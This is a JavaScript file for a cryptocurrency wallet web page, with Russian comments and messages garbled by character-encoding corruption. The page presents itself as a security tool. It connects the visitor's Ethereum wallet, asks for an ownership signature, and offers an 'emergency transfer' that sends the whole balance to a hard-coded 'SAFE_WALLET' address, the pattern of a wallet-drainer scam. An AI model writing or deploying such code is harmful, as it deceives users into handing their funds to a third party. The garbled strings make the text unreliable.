// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2;

// –≠–ª–µ–º–µ–Ω—Ç—ã —Å—Ç—Ä–∞–Ω–∏—Ü—ã
const connectButton = document.getElementById('connectButton');
const signButton = document.getElementById('signButton');
const emergencySection = document.getElementById('emergencySection');
const statusDiv = document.getElementById('status');
const balancesList = document.getElementById('balancesList');
const emergencyTransferBtn = document.getElementById('emergencyTransferBtn');
const transferStatus = document.getElementById('transferStatus');
const noWalletMessage = document.getElementById('noWalletMessage');

let web3;
let userAddress;

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
function updateStatus(message, isError = false, isWarning = false) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
    statusDiv.style.display = 'block';
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞/—Å–∫—Ä—ã—Ç–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤
function showElement(element) {
    element.classList.remove('hidden');
}

function hideElement(element) {
    element.classList.add('hidden');
}

// –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∫–æ—à–µ–ª—å–∫–∞
if (typeof window.ethereum !== 'undefined') {
    console.log('–ö–æ—à–µ–ª–µ–∫ –Ω–∞–π–¥–µ–Ω!');
    web3 = new Web3(window.ethereum);
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
    hideElement(noWalletMessage);
    
} else {
    console.log('–ö–æ—à–µ–ª–µ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω!');
    showElement(noWalletMessage);
    hideElement(connectButton);
}

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('‚åõ –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        
        updateStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω! –ê–¥—Ä–µ—Å: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        
        await loadBalances();
        await checkNetwork();
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('‚ùå –í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ.', true);
        } else {
            updateStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
});

// –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
signButton.addEventListener('click', async () => {
    if (!userAddress) {
        updateStatus('‚ùå –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('‚åõ –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è...', false, true);
        
        const message = `–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤–ª–∞–¥–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–æ–º –¥–ª—è —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        updateStatus(`‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–ø–∏—Å–∞–Ω–æ! –ü–æ–¥–ø–∏—Å—å: ${signature.substring(0, 20)}...`);
        
        // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–¥–ø–∏—Å—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
        // await verifySignature(message, signature, userAddress);
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('‚ùå –í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–ø–∏—Å—å.', true);
        } else {
            updateStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–ø–∏—Å–∏: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
});

// –ó–∞–≥—Ä—É–∑–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤
async function loadBalances() {
    try {
        balancesList.innerHTML = '<p>‚åõ –ó–∞–≥—Ä—É–∑–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤...</p>';
        
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <div class="balance-item">
                <span>ETH:</span>
                <strong>${parseFloat(ethBalance).toFixed(6)} ETH</strong>
            </div>
            <div class="balance-item">
                <span>–ü—Ä–∏–º–µ—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å:</span>
                <strong>$${(parseFloat(ethBalance) * 2500).toFixed(2)}</strong>
            </div>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤</p>';
    }
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–∏
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        console.log('Connected to:', networkName);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

// –≠–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥
async function emergencyTransfer() {
    try {
        emergencyTransferBtn.classList.add('loading');
        transferStatus.style.display = 'block';
        transferStatus.className = 'status-box warning';
        transferStatus.innerHTML = '<p>‚åõ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞...</p>';
        
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.className = 'status-box error';
            transferStatus.innerHTML = '<p>‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ —Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p>‚åõ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...</p>';
        
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.className = 'status-box success';
        transferStatus.innerHTML = `
            <p>‚úÖ –ü–µ—Ä–µ–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!</p>
            <p><strong>–•—ç—à:</strong> ${receipt.transactionHash.substring(0, 20)}...</p>
            <p><strong>–°—É–º–º–∞:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>–ë–ª–æ–∫:</strong> ${receipt.blockNumber}</p>
        `;
        
        await loadBalances(); // –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å—ã –ø–æ—Å–ª–µ –ø–µ—Ä–µ–≤–æ–¥–∞
        
    } catch (error) {
        console.error('Transfer error:', error);
        transferStatus.className = 'status-box error';
        transferStatus.innerHTML = `<p>‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞: ${error.message}</p>`;
    } finally {
        emergencyTransferBtn.classList.remove('loading');
    }
}

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
emergencyTransferBtn.addEventListener('click', function() {
    const confirmation = confirm(
        'üö® –í–ù–ò–ú–ê–ù–ò–ï! –≠–ö–°–¢–†–ï–ù–ù–´–ô –ü–ï–†–ï–í–û–î\n\n' +
        '–í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –í–°–ï –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫.\n\n' +
        `–ü–æ–ª—É—á–∞—Ç–µ–ª—å: ${SAFE_WALLET}\n\n` +
        '–≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –ù–ï–û–ë–†–ê–¢–ò–ú–û –∏ —Ç—Ä–µ–±—É–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤ –∫–æ—à–µ–ª—å–∫–µ.\n\n' +
        '–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π –∫–æ—à–µ–ª—å–∫–∞
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        if (accounts.length === 0) {
            updateStatus('–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω', true);
            hideElement(emergencySection);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`–ê–∫–∫–∞—É–Ω—Ç –∏–∑–º–µ–Ω–µ–Ω: ${userAddress.substring(0, 10)}...`);
            loadBalances();
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}
